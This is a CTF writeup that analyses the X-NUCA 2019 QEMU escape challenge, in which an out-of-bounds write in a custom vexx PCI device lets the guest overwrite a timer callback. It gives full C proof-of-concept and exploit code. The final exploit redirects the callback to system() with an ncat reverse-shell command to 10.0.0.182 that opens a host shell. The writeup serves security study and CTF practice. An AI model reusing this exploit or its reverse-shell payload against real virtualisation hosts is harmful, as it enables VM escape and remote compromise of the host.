---
title: "Qemu Escape Ctf"
date: 2024-06-27T16:23:02-04:00
draft: false
author: hyp
---

# Qemu Escape CTF Writeup

This writeup will demonstrate my analysis and solution of the X-NUCA 2019 qemu escape CTF challenge. For those interested in following along or attempting the challenge themselves, the archive can be found at [vexx.zip](https://drive.google.com/file/d/1YJPumonM6ZC9biulWESBJTF7Dkxb_GI-/view?usp=sharing)

# Initial Analysis

After extracting the archive, we are presented with the following files.

![](/images/1_f3MzSfuy-r4B3CIESL4jEQ.png)

launch.sh is of interest here as it includes specific arguments for running this version of qemu, including a reference to a custom device named vexx.

![](/images/1_xcWgHo7G6Q5vLi8RqjBxeg.png)

Taking a look at the qemu image in Ghidra, we can see a number of functions and types associated with the vexx device.

![](/images/1_k8huRWFWT9rZ8trKURygdg.png)

![](/images/1_qptBsthVDzcNKmsohqbNNg.png)

After some trial and error with retyping, we can get a better idea of how this custom device functions. Let’s take a look at the **vexx_class_init** function to see how the device is initialized.

![](/images/1_BXLnVyEhWQTx5lwiksqjRw.png)

This particular function provides some useful information, such as the vendor id and device id which we will use later. We can also see that two function handlers, **realize** and **exit**, are set to the device specific functions, **pci_vexx_realize** and **pci_vexx_uninit**. The realize function will be called when this device is registered and the exit function will be called when the device is unregistered.

Let’s take a look at **pci_vexx_realize** to see how it functions.

![](/images/1_MyVIq_N9pNCvo48GYYlhzw.png)

Looking at lines 25 and 26, we can see that two mmio regions are initialized and associated with **vexx_mmio_ops** and **vexx_cmb_ops**. Both of these ops structures contain functions that will be called when those MMIO regions are accessed. We can also see that the calls to **memory_region_init_io** reference a specific size, 0x1000 for **vexx_mmio_ops** and 0x4000 for **vexx_cmb_ops**. These size values will help us determine how to map the appropriate sysfs resource file into memory when we want to interact with these MMIO regions.

We can also see that on lines 27 through 29, IO ports are registered and associated with **vexx_port_list** which contains functions that will be called when we access those particular ports.

The previously mentioned MMIO regions and IO ports give us some attack surface through which we can interact with this custom device. The functions that they are associated with are **vexx_mmio_write** and **vex_mmio_read** for the first MMIO region, **vexx_cmb_write** and **vexx_cmb_read** for the second MMIO region, and **vexx_ioport_write** and **vexx_ioport_read** for the IO ports. Taking a closer look at these functions, we can see there is a fairly obvious vulnerability in the **vexx_cmb_write** function.

![](/images/1_Ae9SnWwmk2q8UxXyWrVCZA.png)

On line 30, we can see some offset of **req_buf** getting set to the value we pass into this function. We also can see on line 25 that the size, **addr**, is evaluated to make sure it isn’t over 255 bytes (0x100). If we look at the definition for **req_bytes**, we can see that it is a char buffer with a size of 256 bytes.

![](/images/1_ga79BRl5Gp4BRQ3aapdBSg.png)

The check on line 25 would limit the size of this offset to below the buffer’s limit, but we can see that after the size check on line 28 the size gets increased by an offset value, which we will see is an attacker controlled value. Looking at the other functions associated with MMIO and port IO, we can see that both the offset variable and the memorymode value are controllable by writing to specific IP ports.

![](/images/1_K9csurtvYmpguJdD7CKOOw.png)

Based on this function, we can see that by writing to port 0x240 we can modify the **offset** and by writing to port 0x230 we can modify **memorymode**. If we go ahead and set **memorymode** to 0x1 and **offset** to 0xFF and trigger a call to **vexx_cmb_write**, we can hit the else statement at line 24 of **vexx_cmb_write** and start writing at the end of **req_buf** (i.e — req_buf[255]) which should allow us to overwrite up to 255 bytes past **req_buf** (anything past 255 bytes would fail the check on line 25 of **vexx_cmb_write**).

# Identifying a target

Now that we understand how to trigger the OOB write vulnerability, let’s take a look at what possible targets we may be able to overwrite. If we look at the structure that contains **req_buf**, we can see the next member of that structure labeled **vexxdma**, which contains a member labeled **dma_timer**. Within the **dma_timer struct**, we see a field labeled **cb** which contains a function pointer. It is safe to assume that **cb** stands for callback and this structure defines some function to be called by a timer.

![](/images/1_y68jgPmFqCvC6X-6k6Pr0A.png)

If we refer back to the **vexx_class_init** function, we can see a call to **timer_init_full** which references the **dma_timer** structure. Also, another reference to this structure is made in the **vexx_mmio_write** function in a call to a function labeled **timer_mod**.

![](/images/1_W5VkXJOGkZ2-45uzZMcohQ.png)

Both **timer_init_full** and **timer_mod** are part of the qemu code base, and looking at their definitions, we can get a better idea of what they do.

![](/images/1_KtQPq7D-NJtVPit_5jPBEw.png)

![](/images/1_Xst5XR8jkEyGTpEb8zEkIA.png)

Reading the comments associated with these functions, we can see that **timer_init_full** is used to initialize a timer, and that cb is indeed a callback function and the opaque field is actually passed to the callback function as an argument, which will prove very useful. We can also see that **timer_mod** is used to modify an existing timer.

The idea here is that we are going to overwrite the **cb** and **opaque** fields of the **dma_timer** struct with arbitrary values and then make a call to **vexx_mmio_write** with the proper value (0x98 based on the if-statement) and see if that causes a crash. To do this, we will need to calculate the different between our OOB write (**req_buf** + 0xff) and the **cb** and **opaque** fields.

![](/images/1_OLOAeOBCZ2rPNROOs9hmPg.png)

Since the start of **req_buf** is 0x55555739b520 and the **offset** value we will set is 0xff, we will calculate the distance between 0x55555739b61f and 0x55555739b658 which is 0x39 or 57 bytes and between 0x55555739b61f and 0x55555739b660 which is 0x41 or 65 bytes.

# Causing a crash

To properly trigger this vulnerability, we will have to set the permissions on the IO ports we want to write to, then write to them using the **outb** function. We will also have to make 2 calls to **mmap** in order to provide a useable mapping of the MMIO regions discussed earlier, then write to the calculated offsets within the **vexx_cmb** MMIO region to overwrite our targets and write to address 0x98 of the **vexx_mmio** MMIO region to trigger the **timer_mod** function to update our timer with the overwritten callback function and arguments.

To write a PoC that will trigger this crash, we need to identify the sysfs resource files associated with the two MMIO regions that need to be mapped. This can be achieved using lspci utility and locating the entries associated with the vendor and device IDs we saw declared in the **vexx_class_init** function.

![](/images/1_UTCwbntWQdnK_1qjZ3TKaw.png)

Knowing that the vexx device was registered with a vendor ID of 0x1234 and a device ID of 0x11E9, we easily spot the corresponding entry for this device in the lspci output. Using the BFD, 00:04.0, we can take a look at the sysfs directory shown below.

![](/images/1_GszCQLVkOXKGEor6eFDc5g.png)

The two resource files highlighted in the above image, resource0 and resource1, represent the two MMIO regions that were registered in the **pci_vexx_realize** function. If we look back at that function, we can see that the **vexx_cmb** region was initialized with a size of 0x4000 bytes and **vexx_mmio** was initialized with a size of 0x1000 bytes. Looking at the file sizes in the sysfs directory, we see that resource0 is 4096 or 0x1000 and resource1 is 16384 or 0x4000 which tells us that resource0 represents **vexx_mmio** and resource1 represents **vexx_cmb**.

We now have everything we need to build a PoC and cause a crash.

```
#include <stdlib.h>  
#include <string.h>  
#include <sys/io.h>  
#include <sys/types.h>  
#include <sys/stat.h>  
#include <sys/mman.h>  
#include <fcntl.h>  
  
#define OFF_PORT 0x240  
#define MOD_PORT 0x230  
int main(int argc, char *argv[]) {  
    //Adjust permissions on ports 0x240 and 0x230  
    if(ioperm(OFF_PORT, 3, 1)) {  
        exit(1);  
    }  
    if(ioperm(MOD_PORT, 3, 1)) {  
        exit(2);  
    }  
    //set offset to 0xFF  
    outb(0xFF, OFF_PORT);  
    //set memorymode to 0x1  
    outb(0x1, MOD_PORT);  
    //open resource file associated with vexx_cmb MMIO region  
    int cfd = open(argv[1], O_RDWR|O_SYNC);  
    if(cfd < 0) {  
        exit(3);  
    }  
      
    //open resource file associated with vexx_mmio MMIO region  
    int mfd = open(argv[2], O_RDWR|O_SYNC);  
    if(mfd < 0) {  
        exit(4);  
    }  
    //create vexx_cmb mapping  
    void *cmb = mmap(NULL, 0x4000,   
     PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);  
 if(cmb == MAP_FAILED) {  
     exit(4);  
 }  
 //create vexx_mmio mapping  
 void *mmio = mmap(NULL, 0x1000,   
  PROT_READ|PROT_WRITE, MAP_SHARED, mfd, 0);  
 if(mmio == MAP_FAILED) {  
     exit(5);  
 }  
 //trigger vexx_cmb_write to overwrite cb field  
 *(u_int64_t *)(cmb + atoi(argv[3])) = 0x4141414141414141;  
 //trigger vexx_cmb_write to overwrite opaque field  
 *(u_int64_t *)(cmb + atoi(argv[4])) = 0x4242424242424242;  
 //trigger vexx_mmio_write to call timer_mod  
 *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;  
 exit(0);  
}  
```

```
./exp /sys/devices/pci0000:00/0000:00:04.0/resource1 /sys/devices/pci0000:00/0000:00:04.0/resource0 57 65 152
```

If we attach to our running qemu process with gdb, set a breakpoint on **vexx_cmb_write** and execute our PoC, we see that we are sucessfully overwriting the **cb** and **opaque** fields of the **dma_timer** struct.

![](/images/1_Yp8wmmqbOzpE1WeUL1NiUA.png)

If we continue from here, we can see that qemu segfaults on a call to r14 which holds the value to **cb** that we overwrite. We can also see that the rdi register is set to the overwritten value of **opaque** which will function as an argument to the called function.

![](/images/1_LXcGfISOvk2ZgKr2wFvzRg.png)

![](/images/1_KH-uyZrvp40-qw_x6pPsWg.png)

# Exploitation

So with this vulnerability, we essentially have the ability to call an arbitrary address and pass along a controlled parameter. The first thought is to make a call to **system** and pass along an argument to establish a reverse shell. The one caveat to this is that the **opaque** field which will contain the argument for our call to **system** behaves as a pointer so we can’t just write our argument string to that field. Instead, we need to write the argument string somewhere else and then reference it in the **opaque** field. Looking back at the vexxdma structure where our target exists, we can see another char buffer called **dma_buf** which appears to be a good location to store our argument string.

![](/images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png)

After making these adjustments, our final exploit is as follows:

```
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <sys/io.h>  
#include <sys/types.h>  
#include <sys/stat.h>  
#include <sys/mman.h>  
#include <fcntl.h>  
	  
#define OFF_PORT 0x240  
#define MOD_PORT 0x230  
  
int main(int argc, char *argv[]) {  
    //Adjust permissions on ports 0x240 and 0x230  
    if(ioperm(OFF_PORT, 3, 1)) {  
        exit(1);  
    }  
    if(ioperm(MOD_PORT, 3, 1)) {  
        exit(2);  
    }  
      
    //set offset to 0xFF  
    outb(0xFF, OFF_PORT);  
      
    //set memorymode to 0x1  
    outb(0x1, MOD_PORT);  
    //open resource file associated with vexx_cmb MMIO region  
    int cfd = open(argv[1], O_RDWR|O_SYNC);  
    if(cfd < 0) {  
        exit(3);  
    }  
      
    //open resource file associated with vexx_mmio MMIO region  
    int mfd = open(argv[2], O_RDWR|O_SYNC);  
    if(mfd < 0) {  
        exit(4);  
    }  
    //create vexx_cmb mapping  
    void *cmb = mmap(NULL, 0x4000,   
     PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);  
    if(cmb == MAP_FAILED) {  
        exit(4);  
    }  
    //create vexx_mmio mapping  
    void *mmio = mmap(NULL, 0x1000,   
     PROT_READ|PROT_WRITE, MAP_SHARED,  mfd, 0);  
    if(mmio == MAP_FAILED) {  
        exit(5);  
    }  
    //copy argument string to dma_buf buffer  
    strcpy((cmb+0x59), "ncat 10.0.0.182 4447 -e /bin/bash");  
    //trigger vexx_cmb_write to overwrite cb field w/ address of  system()  
    *(u_int64_t *)(cmb + atoi(argv[3])) = 0x7ffff79dd290;  
      
    //trigger vexx_cmb_write to overwrite opaque field w. pointer to dma_buf  
    *(u_int64_t *)(cmb + atoi(argv[4])) = 0x55555739b678;  
      
    //trigger vexx_mmio_write to call timer_mod  
    *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;  
    exit(0);  
}
```


```
./exp /sys/devices/pci0000:00/0000:00:04.0/resource1 /sys/devices/pci0000:00/0000:00:04.0/
```
